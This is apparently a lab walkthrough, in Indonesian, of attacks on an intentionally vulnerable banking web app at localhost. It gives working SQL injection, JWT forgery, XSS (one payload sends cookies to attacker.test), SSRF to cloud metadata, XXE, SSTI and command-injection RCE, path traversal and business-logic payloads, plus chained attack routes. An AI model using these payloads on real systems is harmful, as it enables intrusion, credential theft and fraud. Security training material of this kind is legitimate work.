# PoC Serangan — Bank UBS Lab

Semua perintah di bawah mengasumsikan:

```bash
BASE=http://127.0.0.1:3001
```

dan server sudah dijalankan dengan `npm run lab:reset`.
Untuk endpoint yang membutuhkan login, simpan cookie:

```bash
curl -s -c jar.txt -X POST $BASE/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"budi","password":"budi123"}'
```

Gunakan `-b jar.txt` pada request berikutnya.

> **Hanya untuk lab terisolasi.** Jangan gunakan pada sistem tanpa izin.

---

## 1. Recon

```bash
curl -s $BASE/api/docs
curl -s $BASE/api/config
curl -s $BASE/api/health
curl -s $BASE/robots.txt
curl -s $BASE/api/debug
curl -s -o db.sqlite $BASE/backup/database.sqlite
curl -s $BASE/backup/app.log
```

`/api/config` membocorkan `jwt_secret`, `internal_api_key`, `smtp_password`,
dan path database. `index.html` juga memuat komentar berisi akun demo dan
lokasi backup.

---

## 2. SQL Injection

### 2.1 Login bypass

```bash
curl -s -X POST $BASE/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'\''--","password":"x"}'
```

Query yang terbentuk:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x'
```

`--` mengomentari sisa query, sehingga login sebagai admin tanpa password.

### 2.2 UNION extraction di user search

```bash
curl -s -G $BASE/api/users/search \
  --data-urlencode "q=%' UNION SELECT 1,username,password,email,role,saldo FROM users--"
```

Kolom `nama_lengkap` pada hasil UNION berisi password asli.

### 2.3 SQLi di user detail

```bash
curl -s "$BASE/api/users/3"
```

ID numerik masuk langsung ke query. Contoh payload (URL-encoded):

```text
/api/users/0%20UNION%20SELECT%201,username,password,email,role,saldo,bio,created_at%20FROM%20users--
```

### 2.4 Exfiltrasi lewat notes

```bash
curl -s -X POST $BASE/api/notes \
  -H 'Content-Type: application/json' \
  -d "{\"user_id\":1,\"content\":\"x'||(SELECT password FROM users WHERE username='admin')||'\"}"

curl -s $BASE/api/notes
```

Isi note akan berisi password admin.

### 2.5 Reset password tanpa OTP

```bash
curl -s -X POST $BASE/api/auth/reset \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin'\''--","otp":"x","new_password":"pwned123"}'

curl -s -X POST $BASE/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"pwned123"}'
```

### 2.6 SQLi di support search

```bash
curl -s -G $BASE/api/support/search \
  --data-urlencode "q=%' UNION SELECT 1,2,username,password,'open',6 FROM users--"
```

### 2.7 Error verbose

```bash
curl -s $BASE/api/users/abc
```

Response 500 memuat `error`, `query`, dan stack trace.

---

## 3. Autentikasi, Session, dan JWT

### 3.1 Header `X-User-Id`

```bash
curl -s $BASE/api/auth/me -H 'X-User-Id: 3'
```

Middleware menerima identitas dari header tanpa signature.

### 3.2 JWT `alg:none`

```bash
node -e "
const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
const t = b64({alg:'none',typ:'JWT'}) + '.' + b64({sub:3,username:'admin',role:'admin',mfa_verified:true}) + '.';
console.log(t);
"
```

Gunakan token tersebut:

```bash
curl -s $BASE/api/auth/me -H "Authorization: Bearer <TOKEN>"
```

`verifyJwt` menerima `alg:none` tanpa memeriksa signature.

### 3.3 MFA bypass

```bash
curl -s -X POST $BASE/api/auth/mfa/verify \
  -H 'Content-Type: application/json' -b jar.txt \
  -d '{"code":"000000"}'
```

atau:

```bash
curl -s -X POST $BASE/api/auth/mfa/verify \
  -H 'Content-Type: application/json' -b jar.txt \
  -d '{"bypass":true}'
```

Tidak ada rate limit atau lockout.

### 3.4 Session fixation

```bash
curl -s -c fix.txt "$BASE/api/auth/session?sid=attacker-fixed-sid"

curl -s -b fix.txt -X POST $BASE/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"budi","password":"budi123","sid":"attacker-fixed-sid"}'

curl -s -H "Cookie: sid=attacker-fixed-sid" $BASE/api/auth/me
```

### 3.5 Logout tidak invalidasi

```bash
curl -s -c logout.txt -X POST $BASE/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"budi","password":"budi123"}'

curl -s -b logout.txt -X POST $BASE/api/auth/logout
curl -s -b logout.txt $BASE/api/auth/me
```

### 3.6 Mass assignment register

```bash
curl -s -X POST $BASE/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"evil","password":"evil123","role":"admin","nama_lengkap":"Evil"}'
```

Field `role` diterima apa adanya.

### 3.7 Mass assignment profil

```bash
curl -s -X PUT $BASE/api/users/1 \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin","saldo":999999999}'
```

---

## 4. XSS

### 4.1 Reflected XSS di login

Login dengan username berisi HTML:

```text
<img src=x onerror=alert(document.cookie)>
```

Pesan error server menyertakan username, dan `Login.tsx` merender error dengan
`dangerouslySetInnerHTML`.

### 4.2 Stored XSS di notes

```bash
curl -s -X POST $BASE/api/notes \
  -H 'Content-Type: application/json' \
  -d '{"user_id":1,"content":"<img src=x onerror=alert(document.cookie)>"}'
```

Buka dashboard; note dirender sebagai HTML.

### 4.3 Stored XSS di support

```bash
curl -s -X POST $BASE/api/support/tickets \
  -H 'Content-Type: application/json' \
  -d '{"user_id":1,"subject":"<svg onload=alert(1)>","message":"<img src=x onerror=alert(1)>"}'
```

### 4.4 DOM XSS lewat hash

Buka:

```text
http://127.0.0.1:3001/support#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

`Support.tsx` melakukan `decodeURIComponent(location.hash)` lalu
`innerHTML = raw`.

### 4.5 Stored XSS lewat bio

```bash
curl -s -X PUT $BASE/api/users/1 \
  -H 'Content-Type: application/json' \
  -d '{"bio":"<img src=x onerror=alert(document.cookie)>"}'
```

Halaman `/profile` merender bio sebagai HTML.

### 4.6 Unrestricted upload

```bash
cat > evil.html <<'EOF'
<html><body>
<script>
fetch('http://attacker.test/?c=' + encodeURIComponent(document.cookie));
</script>
</body></html>
EOF

curl -s -F "file=@evil.html;type=text/html" -F "user_id=1" $BASE/api/upload
```

Buka URL `/uploads/evil.html` yang dikembalikan. Tidak ada validasi ekstensi
atau MIME; file disajikan sebagai `text/html` dari origin yang sama.

### 4.7 Log injection

```bash
curl -s -X POST $BASE/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"<img src=x onerror=alert(1)>","password":"x"}'
```

Log server menyimpan username mentah. Halaman `/admin` dan endpoint
`/api/admin/logs` merender log sebagai HTML.

### 4.8 CSV formula injection

Buat note/transfer dengan nilai yang diawali `=`, `+`, `-`, atau `@`, lalu
unduh `/api/admin/export` atau `/api/statement/export.csv`. Excel dapat
mengeksekusi formula.

---

## 5. IDOR

```bash
curl -s $BASE/api/notes
curl -s $BASE/api/users/3
curl -s $BASE/api/users/3/statement
curl -s $BASE/api/support/tickets
curl -s $BASE/api/files
curl -s "$BASE/api/transfers?user_id=2"
```

Tidak ada pengecekan kepemilikan. `withdraw` juga menerima `user_id` dari body:

```bash
curl -s -X POST $BASE/api/withdraw \
  -H 'Content-Type: application/json' -b jar.txt \
  -d '{"user_id":2,"amount":100000}'
```

---

## 6. SSRF

```bash
curl -s -X POST $BASE/api/integrations/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:3001/api/internal/users"}'
```

Baca file lokal:

```bash
curl -s -X POST $BASE/api/integrations/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"file:///etc/passwd"}'
```

Windows:

```json
{"url":"file:///D:/Isengan%20Bagas/banking-vuln-app/package.json"}
```

Cloud metadata:

```json
{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

Endpoint internal juga bisa diakses langsung dengan spoof `X-Forwarded-For`:

```bash
curl -s $BASE/api/internal/users -H 'X-Forwarded-For: 127.0.0.1'
```

---

## 7. XXE (profil `extreme`)

Buat `xxe.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<kyc>
  <name>&xxe;</name>
</kyc>
```

Windows:

```xml
<!ENTITY xxe SYSTEM "file:///D:/Isengan%20Bagas/banking-vuln-app/package.json">
```

Kirim:

```bash
curl -s -X POST $BASE/api/kyc/import \
  -H 'Content-Type: application/xml' \
  --data-binary @xxe.xml
```

Response `expanded` berisi isi file. Entity HTTP juga didukung:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:3001/api/config">
```

---

## 8. SSTI (profil `extreme`)

Login dulu, lalu:

```bash
curl -s -X POST $BASE/api/notifications/preview \
  -H 'Content-Type: application/json' -b jar.txt \
  -d '{"template":"<%= 7 * 7 %>"}'
```

RCE:

```bash
cat > ssti.json <<'EOF'
{"template":"<%= require('child_process').execSync('whoami').toString() %>"}
EOF

curl -s -X POST $BASE/api/notifications/preview \
  -H 'Content-Type: application/json' -b jar.txt \
  --data-binary @ssti.json
```

EJS dirender dengan `require` dan `process` di locals.

---

## 9. Command Injection (profil `extreme`)

Butuh role admin. Cara cepat: `X-User-Id: 3` atau SQLi login admin.

Windows:

```bash
curl -s -X POST $BASE/api/admin/diagnostics/ping \
  -H 'Content-Type: application/json' \
  -H 'X-User-Id: 3' \
  -d '{"host":"127.0.0.1 & whoami"}'
```

Linux:

```bash
curl -s -X POST $BASE/api/admin/diagnostics/ping \
  -H 'Content-Type: application/json' \
  -H 'X-User-Id: 3' \
  -d '{"host":"127.0.0.1; id"}'
```

Server menjalankan `echo <host>` lewat `child_process.exec`.

---

## 10. Upload dan Path Traversal

### 10.1 Path traversal baca

```bash
curl -s -o leaked.sqlite "$BASE/api/files/download?name=../database.sqlite"
curl -s "$BASE/api/files/download?name=../server.js"
curl -s "$BASE/api/files/download?name=../.env"
```

`path.join(UPLOAD_DIR, name)` menormalkan `..`, sehingga keluar dari folder
uploads. Upload sendiri memakai `path.basename()` sehingga tidak bisa menulis
keluar folder.

### 10.2 Upload HTML/SVG

Lihat bagian XSS 4.6. File disajikan lewat `/uploads/<nama>`.

---

## 11. Business Logic

### 11.1 Transfer negatif

```bash
curl -s "$BASE/api/transfer?from_id=2&to_id=1&amount=-100000&note=negative"
```

Saldo source bertambah karena `saldo = saldo - (-100000)`.

### 11.2 Fee negatif

```bash
curl -s -X POST $BASE/api/transfer \
  -H 'Content-Type: application/json' \
  -d '{"from_id":2,"to_id":1,"amount":1000,"fee":-50000,"note":"fee"}'
```

### 11.3 Race condition withdraw

`withdraw` membaca saldo, menunggu `LAB_RACE_DELAY_MS` (default 150 ms), lalu
mengurangi saldo tanpa transaksi/locking.

```bash
seq 1 10 | xargs -I{} -P10 curl -s -X POST $BASE/api/withdraw \
  -H 'Content-Type: application/json' -b jar.txt \
  -d '{"amount":1000000}' -o /dev/null
```

### 11.4 Replay kupon

```bash
for i in 1 2 3; do
  curl -s -X POST $BASE/api/coupons/redeem \
    -H 'Content-Type: application/json' -b jar.txt \
    -d '{"code":"HEMAT50"}'
done
```

`used_by` tidak pernah dicek.

### 11.5 Price tampering tagihan

```bash
curl -s -X POST $BASE/api/bills/pay \
  -H 'Content-Type: application/json' -b jar.txt \
  -d '{"bill_id":"TAGIHAN-1","amount":1}'
```

Harga dipercaya dari client.

### 11.6 Saldo negatif

Transfer/withdraw tidak memblokir saldo negatif. Cek dengan:

```bash
curl -s $BASE/api/users/1
```

---

## 12. Prototype Pollution

Kirim JSON **mentah** (bukan object literal JavaScript):

```bash
curl -s -X POST $BASE/api/profile/preferences \
  -H 'Content-Type: application/json' -b jar.txt \
  --data-binary '{"preferences":{"__proto__":{"isAdmin":true}}}'
```

Response `prototype_isAdmin:true`. Setelah itu, user biasa dapat mengakses
endpoint admin karena `requireAdmin` mengecek `req.user.isAdmin`:

```bash
curl -s -X POST $BASE/api/admin/users/1/role \
  -H 'Content-Type: application/json' -b jar.txt \
  -d '{"role":"admin"}'
```

Pollution bertahan di proses sampai server di-restart/reset.

---

## 13. CORS, CSRF, Open Redirect, Clickjacking

### 13.1 CORS

```bash
curl -s -i $BASE/api/config -H 'Origin: http://evil.test' | grep -i access-control
```

Hasil:

```text
Access-Control-Allow-Origin: http://evil.test
Access-Control-Allow-Credentials: true
```

### 13.2 CSRF

```html
<!-- csrf.html -->
<script>
  location = 'http://127.0.0.1:3001/api/transfer?from_id=1&to_id=2&amount=100000&note=csrf';
</script>
```

Cookie `SameSite=Lax` terkirim pada navigasi top-level GET. Subresource
seperti `<img>` tidak akan mengirim cookie Lax.

### 13.3 Open redirect

```bash
curl -s -i "$BASE/api/auth/redirect?next=https://example.com" | grep -i location
```

Login juga menerima `?next=https://example.com` dan melakukan
`window.location.href = next`.

### 13.4 Clickjacking

```html
<iframe src="http://127.0.0.1:3001/admin" width="900" height="700"></iframe>
```

Tidak ada `X-Frame-Options` atau CSP `frame-ancestors`.

---

## 14. Backup, Log, dan Secret

```bash
curl -s -o db.sqlite $BASE/backup/database.sqlite
curl -s $BASE/backup/app.log
curl -s $BASE/backup/server-output.log
curl -s -o db2.sqlite $BASE/api/admin/backup
curl -s $BASE/api/admin/export
curl -s $BASE/api/admin/logs
curl -s $BASE/api/config
```

Database berisi password plaintext. Log berisi username/password dan query SQL.
CSV export berisi semua password.

---

## 15. Rantai Serangan

### Chain A — SQLi ke RCE

1. SQLi login admin (`admin'--`).
2. Buka `/api/admin/users` untuk melihat semua user/password.
3. `POST /api/admin/diagnostics/ping` dengan `127.0.0.1 & whoami`.
4. Dapatkan RCE.

### Chain B — MITM ke takeover

1. Capture HTTP login di Wireshark.
2. Ambil `sid` dari `Set-Cookie` atau body `session_id`.
3. Gunakan cookie untuk `/api/auth/me` dan `/api/admin/users`.
4. Kirim CSRF transfer atau ubah profil.

### Chain C — Stored XSS ke RCE

1. Simpan payload XSS di notes/support.
2. Admin membuka dashboard/support; cookie `sid` dicuri (non-HttpOnly).
3. Gunakan session admin untuk SSTI/command injection.

### Chain D — IDOR ke database

1. `/api/files/download?name=../database.sqlite`.
2. Baca password plaintext semua user.
3. Login sebagai admin atau user lain.

### Chain E — Prototype pollution ke admin

1. Login user biasa.
2. Kirim `__proto__.isAdmin=true`.
3. Akses endpoint admin, lalu command injection.

### Chain F — SSRF ke secret internal

1. `/api/integrations/fetch` ke `http://127.0.0.1:3001/api/internal/users`.
2. Dapatkan `internal_api_key` dan seluruh user.
3. Gunakan secret untuk endpoint internal lain.

### Chain G — Business logic

1. Transfer negatif untuk menambah saldo.
2. Replay kupon.
3. Race withdraw untuk menarik berkali-kali.
4. Bayar tagihan dengan amount 1.

---

## 16. Cleanup

```bash
npm run lab:reset
```

Jika RCE sudah dijalankan di host dan Anda ingin memastikan source bersih:

```bash
# HATI-HATI: menghapus perubahan yang belum di-commit
npm run lab:reset -- --hard --yes
```

Alternatif Docker:

```bash
npm run lab:docker:reset
```

---

## 17. Catatan Profil

- `LAB_PROFILE=extreme` (default): XXE, SSTI, command injection aktif.
- `LAB_PROFILE=web`: tiga fitur di atas mengembalikan 404; kerentanan web
  lainnya tetap aktif.

Cek profil:

```bash
curl -s $BASE/api/health
```
